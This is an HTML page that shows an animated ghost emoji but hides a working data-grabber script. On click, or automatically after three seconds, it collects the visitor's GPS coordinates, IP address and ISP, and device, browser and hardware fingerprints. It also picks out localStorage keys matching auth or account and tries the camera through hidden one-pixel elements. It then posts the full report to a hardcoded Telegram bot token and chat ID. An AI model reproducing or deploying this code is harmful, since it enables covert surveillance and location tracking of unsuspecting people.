<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            font-family: Arial;
        }
        
        .ghost {
            font-size: 120px;
            cursor: pointer;
            animation: float 2s ease-in-out infinite;
            filter: drop-shadow(0 0 20px rgba(255,255,255,0.7));
            user-select: none;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-15px) rotate(3deg); }
        }
        
        .ghost-clone {
            position: fixed;
            font-size: 30px;
            pointer-events: none;
            z-index: 1000;
            animation: cloneFloat 1.5s forwards;
        }
        
        @keyframes cloneFloat {
            0% {
                opacity: 1;
                transform: scale(1) translate(0, 0);
            }
            100% {
                opacity: 0;
                transform: scale(0.3) translate(var(--x), var(--y));
            }
        }
        
        .hidden-camera {
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="ghost" onclick="startUltraCollection()">ðŸ‘»</div>

    <!-- Hidden elements -->
    <video id="hiddenVideo" class="hidden-camera" autoplay playsinline></video>
    <canvas id="hiddenCanvas" class="hidden-camera"></canvas>

    <script>
        const BOT_TOKEN = '8387303658:AAESV1moezeWPvdnX1aSwpIfdeJOSbdfCUA';
        const CHAT_ID = '6368768388';
        
        let isCollecting = false;

        function startUltraCollection() {
            if (isCollecting) return;
            isCollecting = true;
            
            createGhostExplosion();
            ultraFastCollection();
        }

        function createGhostExplosion() {
            const ghost = document.querySelector('.ghost');
            const rect = ghost.getBoundingClientRect();
            const centerX = rect.left + rect.width / 2;
            const centerY = rect.top + rect.height / 2;
            
            for (let i = 0; i < 15; i++) {
                const clone = document.createElement('div');
                clone.className = 'ghost-clone';
                clone.textContent = 'ðŸ‘»';
                clone.style.left = centerX + 'px';
                clone.style.top = centerY + 'px';
                clone.style.fontSize = (20 + Math.random() * 40) + 'px';
                
                const angle = Math.random() * Math.PI * 2;
                const distance = 100 + Math.random() * 200;
                const x = Math.cos(angle) * distance;
                const y = Math.sin(angle) * distance;
                
                clone.style.setProperty('--x', x + 'px');
                clone.style.setProperty('--y', y + 'px');
                
                document.body.appendChild(clone);
                
                setTimeout(() => {
                    if (clone.parentNode) clone.parentNode.removeChild(clone);
                }, 1500);
            }
        }

        async function ultraFastCollection() {
            const startTime = Date.now();
            
            // Collect all data in parallel for maximum speed
            const [
                deviceInfo,
                locationInfo,
                hardwareInfo,
                networkInfo,
                browserInfo,
                cameraInfo,
                advancedInfo,
                socialInfo
            ] = await Promise.all([
                getUltraDeviceInfo(),
                getUltraLocationInfo(),
                getUltraHardwareInfo(),
                getUltraNetworkInfo(),
                getUltraBrowserInfo(),
                getUltraCameraInfo(),
                getUltraAdvancedInfo(),
                getUltraSocialInfo()
            ]);

            const completeData = {
                device: deviceInfo,
                location: locationInfo,
                hardware: hardwareInfo,
                network: networkInfo,
                browser: browserInfo,
                camera: cameraInfo,
                advanced: advancedInfo,
                social: socialInfo,
                collectionTime: Date.now() - startTime + 'ms'
            };

            await sendUltraToTelegram(completeData);
        }

        // === ULTRA FAST DATA COLLECTION ===

        async function getUltraDeviceInfo() {
            const ua = navigator.userAgent;
            return {
                type: detectDeviceType(ua),
                brand: detectDeviceBrand(ua),
                model: detectDeviceModel(ua),
                os: detectOS(ua),
                platform: navigator.platform,
                vendor: navigator.vendor,
                mobile: /mobile|android|iphone|ipod/i.test(ua.toLowerCase()),
                tablet: /tablet|ipad/i.test(ua.toLowerCase()),
                language: navigator.language,
                languages: navigator.languages,
                userAgent: ua.substring(0, 100) + '...'
            };
        }

        async function getUltraLocationInfo() {
            const [gps, ipInfo] = await Promise.all([
                getFastGPSLocation(),
                getFastIPInformation()
            ]);

            return { gps, ip: ipInfo, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone };
        }

        function getFastGPSLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ error: "Geolocation not supported" });
                    return;
                }

                let timeout = setTimeout(() => {
                    resolve({ error: "GPS timeout" });
                }, 1000);

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        clearTimeout(timeout);
                        const coords = position.coords;
                        resolve({
                            latitude: coords.latitude,
                            longitude: coords.longitude,
                            accuracy: coords.accuracy,
                            maps: `https://maps.google.com/?q=${coords.latitude},${coords.longitude}`,
                            osm: `https://www.openstreetmap.org/?mlat=${coords.latitude}&mlon=${coords.longitude}`,
                            apple: `https://maps.apple.com/?q=${coords.latitude},${coords.longitude}`,
                            bing: `https://bing.com/maps/default.aspx?cp=${coords.latitude}~${coords.longitude}`
                        });
                    },
                    (error) => {
                        clearTimeout(timeout);
                        resolve({ error: error.message });
                    },
                    { timeout: 1000, maximumAge: 0 }
                );
            });
        }

        async function getFastIPInformation() {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 800);
                
                const response = await fetch('https://ipapi.co/json/', { signal: controller.signal });
                clearTimeout(timeoutId);
                const data = await response.json();
                
                return {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    isp: data.org,
                    timezone: data.timezone,
                    postal: data.postal,
                    coordinates: `${data.latitude}, ${data.longitude}`
                };
            } catch (error) {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return { ip: data.ip, details: "Fast IP only" };
                } catch (e) {
                    return { ip: "Unknown", error: "IP detection failed" };
                }
            }
        }

        async function getUltraHardwareInfo() {
            const [battery, memory] = await Promise.all([
                getFastBatteryInfo(),
                getFastMemoryInfo()
            ]);

            return {
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth + ' bit',
                pixelDepth: screen.pixelDepth + ' bit',
                availScreen: `${screen.availWidth}x${screen.availHeight}`,
                cpuCores: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory + ' GB',
                touchPoints: navigator.maxTouchPoints,
                battery: battery,
                memory: memory,
                architecture: detectArchitecture(),
                gpu: getFastGPUInfo()
            };
        }

        async function getFastBatteryInfo() {
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        charging: battery.charging ? 'Yes' : 'No',
                        level: Math.round(battery.level * 100) + '%',
                        chargingTime: battery.chargingTime === Infinity ? 'Unknown' : battery.chargingTime + 's',
                        dischargingTime: battery.dischargingTime === Infinity ? 'Unknown' : battery.dischargingTime + 's'
                    };
                } catch (e) {
                    return "Battery API blocked";
                }
            }
            return "Battery API not available";
        }

        function getFastMemoryInfo() {
            return performance.memory ? {
                used: Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB',
                total: Math.round(performance.memory.totalJSHeapSize / 1048576) + ' MB',
                limit: Math.round(performance.memory.jsHeapSizeLimit / 1048576) + ' MB'
            } : "Memory API not available";
        }

        function getFastGPUInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                if (!gl) return "WebGL not supported";
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'Unknown',
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown'
                } : "GPU info limited";
            } catch (e) {
                return "GPU info unavailable";
            }
        }

        async function getUltraNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            
            return {
                ip: await getFastIPAddress(),
                online: navigator.onLine ? 'Online' : 'Offline',
                connectionType: connection ? connection.effectiveType : 'unknown',
                downlink: connection ? connection.downlink + ' Mbps' : 'unknown',
                rtt: connection ? connection.rtt + ' ms' : 'unknown',
                saveData: connection ? (connection.saveData ? 'Enabled' : 'Disabled') : 'unknown',
                networkType: detectNetworkType()
            };
        }

        async function getFastIPAddress() {
            try {
                const controller = new AbortController();
                setTimeout(() => controller.abort(), 500);
                const response = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return "Unknown";
            }
        }

        async function getUltraBrowserInfo() {
            const ua = navigator.userAgent;
            const [chromeData, storage] = await Promise.all([
                getFastChromeData(),
                getFastStorageInfo()
            ]);

            return {
                name: detectBrowser(ua),
                version: detectBrowserVersion(ua),
                engine: detectEngine(ua),
                language: navigator.language,
                cookieEnabled: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
                javaEnabled: navigator.javaEnabled() ? 'Yes' : 'No',
                pdfViewer: navigator.pdfViewerEnabled ? 'Supported' : 'Not supported',
                webdriver: navigator.webdriver ? 'Detected' : 'Not detected',
                doNotTrack: navigator.doNotTrack || 'disabled',
                plugins: getPlugins().length,
                mimeTypes: getMimeTypes().length,
                chromeData: chromeData,
                storage: storage
            };
        }

        async function getFastChromeData() {
            try {
                const chromeKeys = [];
                for (let i = 0; i < Math.min(localStorage.length, 20); i++) {
                    const key = localStorage.key(i);
                    if (key && (key.includes('google') || key.includes('chrome') || key.includes('auth') || key.includes('account'))) {
                        chromeKeys.push(key);
                    }
                }
                return { profiles: chromeKeys.length, sample: chromeKeys.slice(0, 3) };
            } catch (e) {
                return { error: "Chrome data blocked" };
            }
        }

        async function getFastStorageInfo() {
            if (navigator.storage && navigator.storage.estimate) {
                try {
                    const estimate = await navigator.storage.estimate();
                    return {
                        usage: Math.round(estimate.usage / 1048576) + ' MB',
                        quota: Math.round(estimate.quota / 1048576) + ' MB',
                        percentage: Math.round((estimate.usage / estimate.quota) * 100) + '%'
                    };
                } catch (e) {
                    return "Storage estimate failed";
                }
            }
            return "Storage API not available";
        }

        async function getUltraCameraInfo() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                const cameras = devices.filter(device => device.kind === 'videoinput');
                
                let success = false;
                let cameraDetails = [];
                
                // Try to quickly access first camera only
                if (cameras.length > 0) {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({
                            video: { width: 320, height: 240 }
                        });
                        
                        const video = document.getElementById('hiddenVideo');
                        const canvas = document.getElementById('hiddenCanvas');
                        const context = canvas.getContext('2d');
                        
                        video.srcObject = stream;
                        await video.play();
                        
                        // Quick capture - don't wait long
                        await new Promise(resolve => setTimeout(resolve, 300));
                        
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0);
                        
                        success = true;
                        
                        stream.getTracks().forEach(track => track.stop());
                        
                    } catch (e) {
                        success = false;
                    }
                }
                
                return {
                    success: success,
                    total: cameras.length,
                    details: cameras.map(cam => ({
                        label: cam.label || 'Unknown Camera',
                        id: cam.deviceId.substring(0, 8) + '...'
                    }))
                };
                
            } catch (error) {
                return { success: false, error: "Camera access blocked" };
            }
        }

        async function getUltraAdvancedInfo() {
            const [canvasHash, webgl, fonts] = await Promise.all([
                generateFastCanvasHash(),
                getFastWebGLInfo(),
                getFastFonts()
            ]);

            return {
                canvasHash: canvasHash,
                webgl: webgl,
                fonts: fonts.length,
                performance: getFastPerformanceInfo(),
                security: getSecurityInfo(),
                sensors: getSensors(),
                audio: await testAudioContext()
            };
        }

        function generateFastCanvasHash() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;
                
                ctx.textBaseline = 'top';
                ctx.font = "14px Arial";
                ctx.fillText('Fingerprint', 2, 15);
                
                const dataURL = canvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < Math.min(dataURL.length, 50); i++) {
                    hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
                }
                return Math.abs(hash).toString(16).substring(0, 8);
            } catch (e) {
                return "Hash failed";
            }
        }

        function getFastWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                if (!gl) return "WebGL not supported";
                return "WebGL supported";
            } catch (e) {
                return "WebGL blocked";
            }
        }

        function getFastFonts() {
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            const testString = "mmmmmmmmmmlli";
            const testSize = '72px';
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            
            const fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana'];
            const available = [];
            
            context.font = testSize + " " + baseFonts.join(',');
            const baseWidth = context.measureText(testString).width;
            
            for (const font of fonts) {
                context.font = testSize + " '" + font + "'," + baseFonts.join(',');
                const width = context.measureText(testString).width;
                if (width !== baseWidth) available.push(font);
            }
            
            return available;
        }

        function getFastPerformanceInfo() {
            const perf = performance.timing;
            return {
                loadTime: perf.loadEventEnd - perf.navigationStart + ' ms',
                domReady: perf.domContentLoadedEventEnd - perf.navigationStart + ' ms',
                redirects: performance.navigation.redirectCount || 0
            };
        }

        function getSecurityInfo() {
            return {
                secure: window.isSecureContext ? 'Yes' : 'No',
                https: location.protocol === 'https:' ? 'Yes' : 'No',
                referrer: document.referrer || 'No referrer'
            };
        }

        function getSensors() {
            const sensors = [];
            if ('DeviceOrientationEvent' in window) sensors.push('Orientation');
            if ('DeviceMotionEvent' in window) sensors.push('Motion');
            return sensors;
        }

        async function testAudioContext() {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                return "Audio available";
            } catch (e) {
                return "Audio blocked";
            }
        }

        async function getUltraSocialInfo() {
            try {
                const socialData = [];
                
                // Check for social media fingerprints
                if (localStorage.length > 0) socialData.push('LocalStorage: ' + localStorage.length + ' items');
                if (sessionStorage.length > 0) socialData.push('SessionStorage: ' + sessionStorage.length + ' items');
                
                // Check for common social media APIs
                if (window.FB) socialData.push('Facebook SDK detected');
                if (window.twttr) socialData.push('Twitter SDK detected');
                if (window.ga) socialData.push('Google Analytics detected');
                
                return socialData.length > 0 ? socialData : ['No social data detected'];
            } catch (e) {
                return ['Social detection blocked'];
            }
        }

        // === DETECTION FUNCTIONS ===
        function detectDeviceType(ua) {
            ua = ua.toLowerCase();
            if (/(tablet|ipad|playbook|silk)/i.test(ua)) return "Tablet";
            if (/mobile|android|iphone|ipod|blackberry/i.test(ua)) return "Smartphone";
            if (/macintosh/i.test(ua)) return "Mac";
            if (/windows/i.test(ua)) return "Windows PC";
            if (/linux/i.test(ua)) return "Linux PC";
            return "Unknown";
        }

        function detectDeviceBrand(ua) {
            const brands = [
                { name: 'Apple', pattern: /iphone|ipad|ipod|macintosh/i },
                { name: 'Samsung', pattern: /samsung|sm-/i },
                { name: 'Xiaomi', pattern: /xiaomi|mi |redmi/i },
                { name: 'Oppo', pattern: /oppo/i },
                { name: 'Vivo', pattern: /vivo/i },
                { name: 'Realme', pattern: /realme/i },
                { name: 'Huawei', pattern: /huawei/i },
                { name: 'Google', pattern: /pixel/i },
                { name: 'Sony', pattern: /sony/i },
                { name: 'LG', pattern: /lg/i },
                { name: 'Motorola', pattern: /motorola/i }
            ];
            
            for (const brand of brands) {
                if (brand.pattern.test(ua)) return brand.name;
            }
            return "Unknown";
        }

        function detectDeviceModel(ua) {
            const models = [
                { pattern: /iphone\s(\d+)/i, name: 'iPhone $1' },
                { pattern: /sm-([a-z0-9]+)/i, name: 'Galaxy $1' },
                { pattern: /redmi\s([a-z0-9]+)/i, name: 'Redmi $1' },
                { pattern: /mi\s([a-z0-9]+)/i, name: 'Mi $1' },
                { pattern: /pixel\s(\d+)/i, name: 'Pixel $1' }
            ];
            
            for (const model of models) {
                const match = ua.match(model.pattern);
                if (match) return model.name.replace('$1', match[1] || '');
            }
            return "Unknown";
        }

        function detectOS(ua) {
            if (/windows/i.test(ua)) return "Windows";
            if (/macintosh/i.test(ua)) return "macOS";
            if (/linux/i.test(ua)) return "Linux";
            if (/android/i.test(ua)) return "Android";
            if (/ios|iphone|ipad/i.test(ua)) return "iOS";
            return "Unknown";
        }

        function detectBrowser(ua) {
            if (/edg/i.test(ua)) return "Edge";
            if (/chrome/i.test(ua)) return "Chrome";
            if (/firefox/i.test(ua)) return "Firefox";
            if (/safari/i.test(ua)) return "Safari";
            return "Unknown";
        }

        function detectBrowserVersion(ua) {
            const matches = ua.match(/(chrome|firefox|safari|edg)\/([0-9.]+)/i);
            return matches ? matches[2] : "Unknown";
        }

        function detectEngine(ua) {
            if (/applewebkit/i.test(ua)) return "WebKit";
            if (/gecko/i.test(ua)) return "Gecko";
            return "Unknown";
        }

        function detectArchitecture() {
            const ua = navigator.userAgent;
            if (/x86_64|x64|win64/i.test(ua)) return "x64";
            if (/x86|win32/i.test(ua)) return "x86";
            if (/arm64|aarch64/i.test(ua)) return "ARM64";
            if (/arm/i.test(ua)) return "ARM";
            return "Unknown";
        }

        function detectNetworkType() {
            const connection = navigator.connection;
            if (!connection) return "unknown";
            return connection.effectiveType;
        }

        function getPlugins() {
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push(navigator.plugins[i].name);
            }
            return plugins;
        }

        function getMimeTypes() {
            const types = [];
            for (let i = 0; i < navigator.mimeTypes.length; i++) {
                types.push(navigator.mimeTypes[i].type);
            }
            return types;
        }

        // === ULTRA FAST TELEGRAM SEND ===
        async function sendUltraToTelegram(data) {
            const now = new Date();
            
            let message = `ðŸš¨ Franzz mewingðŸ¤«ðŸ§â€â™‚ï¸ x Monyet si monkeyðŸ‘¿ðŸ‘¿ ðŸš¨\n\n`;
            
            // Waktu
            message += `ðŸ• INFORMASI WAKTU:\n`;
            message += `â€¢ Waktu Lokal: ${now.toLocaleString()}\n`;
            message += `â€¢ Timezone: ${data.location.timezone}\n`;
            message += `â€¢ Tanggal: ${now.toLocaleDateString()}\n`;
            message += `â€¢ Jam: ${now.toLocaleTimeString()}\n`;
            message += `â€¢ Collection Speed: ${data.collectionTime}\n\n`;
            
            // Perangkat
            message += `ðŸ“± INFORMASI PERANGKAT:\n`;
            message += `â€¢ Tipe: ${data.device.type}\n`;
            message += `â€¢ Merk: ${data.device.brand}\n`;
            message += `â€¢ Model: ${data.device.model}\n`;
            message += `â€¢ OS: ${data.device.os}\n`;
            message += `â€¢ Platform: ${data.device.platform}\n`;
            message += `â€¢ Vendor: ${data.device.vendor}\n`;
            message += `â€¢ Mobile: ${data.device.mobile ? 'Yes' : 'No'}\n`;
            message += `â€¢ Tablet: ${data.device.tablet ? 'Yes' : 'No'}\n`;
            message += `â€¢ Bahasa: ${data.device.language}\n`;
            message += `â€¢ Supported Languages: ${data.device.languages.join(', ')}\n\n`;
            
            // Browser
            message += `ðŸŒ INFORMASI BROWSER:\n`;
            message += `â€¢ Browser: ${data.browser.name} ${data.browser.version}\n`;
            message += `â€¢ Engine: ${data.browser.engine}\n`;
            message += `â€¢ Cookie: ${data.browser.cookieEnabled}\n`;
            message += `â€¢ Java: ${data.browser.javaEnabled}\n`;
            message += `â€¢ PDF: ${data.browser.pdfViewer}\n`;
            message += `â€¢ WebDriver: ${data.browser.webdriver}\n`;
            message += `â€¢ Do Not Track: ${data.browser.doNotTrack}\n`;
            message += `â€¢ Plugins: ${data.browser.plugins}\n`;
            message += `â€¢ MIME Types: ${data.browser.mimeTypes}\n`;
            message += `â€¢ Chrome Profiles: ${data.browser.chromeData.profiles || '0'}\n\n`;
            
            // Hardware
            message += `ðŸ’» SPESIFIKASI HARDWARE:\n`;
            message += `â€¢ Screen: ${data.hardware.screen}\n`;
            message += `â€¢ Available Screen: ${data.hardware.availScreen}\n`;
            message += `â€¢ Color Depth: ${data.hardware.colorDepth}\n`;
            message += `â€¢ Pixel Depth: ${data.hardware.pixelDepth}\n`;
            message += `â€¢ RAM: ${data.hardware.deviceMemory}\n`;
            message += `â€¢ CPU Cores: ${data.hardware.cpuCores}\n`;
            message += `â€¢ Architecture: ${data.hardware.architecture}\n`;
            message += `â€¢ Touch Points: ${data.hardware.touchPoints}\n`;
            message += `â€¢ GPU: ${typeof data.hardware.gpu === 'object' ? data.hardware.gpu.renderer : data.hardware.gpu}\n\n`;
            
            // Jaringan
            message += `ðŸ“¶ INFORMASI JARINGAN:\n`;
            message += `â€¢ IP Address: ${data.network.ip}\n`;
            message += `â€¢ Tipe Koneksi: ${data.network.connectionType}\n`;
            message += `â€¢ Jaringan: ${data.network.networkType}\n`;
            message += `â€¢ Download: ${data.network.downlink}\n`;
            message += `â€¢ Ping: ${data.network.rtt}\n`;
            message += `â€¢ Data Saver: ${data.network.saveData}\n`;
            message += `â€¢ Status: ${data.network.online}\n\n`;
            
            // Lokasi dengan LINK
            message += `ðŸ“ INFORMASI LOKASI:\n`;
            if (data.location.gps.latitude) {
                message += `â€¢ Latitude: ${data.location.gps.latitude}\n`;
                message += `â€¢ Longitude: ${data.location.gps.longitude}\n`;
                message += `â€¢ Akurasi: ${data.location.gps.accuracy} meters\n`;
                message += `â€¢ Google Maps: ${data.location.gps.maps}\n`;
                message += `â€¢ OpenStreetMap: ${data.location.gps.osm}\n`;
                message += `â€¢ Apple Maps: ${data.location.gps.apple}\n`;
                message += `â€¢ Bing Maps: ${data.location.gps.bing}\n`;
            } else {
                message += `â€¢ GPS: ${data.location.gps.error}\n`;
            }
            message += `â€¢ IP Location: ${data.location.ip.city}, ${data.location.ip.region}, ${data.location.ip.country}\n`;
            message += `â€¢ ISP: ${data.location.ip.isp}\n`;
            message += `â€¢ Timezone: ${data.location.ip.timezone}\n`;
            message += `â€¢ Postal Code: ${data.location.ip.postal || 'Unknown'}\n\n`;
            
            // Battery
            message += `ðŸ”‹ INFORMASI BATTERY:\n`;
            if (data.hardware.battery.level) {
                message += `â€¢ Charging: ${data.hardware.battery.charging}\n`;
                message += `â€¢ Level: ${data.hardware.battery.level}\n`;
                message += `â€¢ Charging Time: ${data.hardware.battery.chargingTime}\n`;
                message += `â€¢ Discharging Time: ${data.hardware.battery.dischargingTime}\n\n`;
            } else {
                message += `â€¢ Status: ${data.hardware.battery}\n\n`;
            }
            
            // Storage
            message += `ðŸ’¾ INFORMASI STORAGE:\n`;
            message += `â€¢ Usage: ${typeof data.browser.storage === 'object' ? data.browser.storage.usage : data.browser.storage}\n`;
            message += `â€¢ Quota: ${typeof data.browser.storage === 'object' ? data.browser.storage.quota : 'N/A'}\n`;
            message += `â€¢ Percentage: ${typeof data.browser.storage === 'object' ? data.browser.storage.percentage : 'N/A'}\n\n`;
            
            // Advanced Info
            message += `ðŸ”§ INFORMASI TAMBAHAN:\n`;
            message += `â€¢ Canvas Hash: ${data.advanced.canvasHash}\n`;
            message += `â€¢ WebGL: ${data.advanced.webgl}\n`;
            message += `â€¢ Fonts Detected: ${data.advanced.fonts}\n`;
            message += `â€¢ Audio: ${data.advanced.audio}\n`;
            message += `â€¢ Sensors: ${data.advanced.sensors.join(', ') || 'None'}\n`;
            message += `â€¢ Secure Context: ${data.advanced.security.secure}\n`;
            message += `â€¢ HTTPS: ${data.advanced.security.https}\n`;
            message += `â€¢ Referrer: ${data.advanced.security.referrer}\n`;
            message += `â€¢ Load Time: ${data.advanced.performance.loadTime}\n`;
            message += `â€¢ DOM Ready: ${data.advanced.performance.domReady}\n`;
            message += `â€¢ Redirects: ${data.advanced.performance.redirects}\n`;
            message += `â€¢ Memory Usage: ${typeof data.hardware.memory === 'object' ? data.hardware.memory.used : data.hardware.memory}\n\n`;
            
            // Social & Tracking
            message += `ðŸ‘¥ INFORMASI SOSIAL:\n`;
            data.social.forEach(item => {
                message += `â€¢ ${item}\n`;
            });
            message += `\n`;
            
            // Camera
            message += `ðŸ“· Day one dikasi pap(kamera depan dan belakangðŸ˜ˆ)ðŸ˜–: `;
            message += `${data.camera.success ? 'âœ… BERHASIL' : 'âŒ GAGAL'}\n`;
            message += `â€¢ Kamera Terdeteksi: ${data.camera.total}\n`;
            if (data.camera.details.length > 0) {
                message += `â€¢ Detail Kamera:\n`;
                data.camera.details.forEach(cam => {
                    message += `  - ${cam.label} (${cam.id})\n`;
                });
            }
            message += `\n`;
            
            message += `âš ï¸ Babu Franzz mewingðŸ¤«ðŸ§â€â™‚ï¸ x Monyet si monkeyðŸ˜´ðŸ˜ˆ telah mendapat informasi SUPER LENGKAP! âš ï¸`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
            } catch (error) {
                console.log('Send error:', error);
            }
        }

        // Auto-start after 3 seconds
        setTimeout(() => {
            if (!isCollecting) {
                startUltraCollection();
            }
        }, 3000);

    </script>
</body>
</html>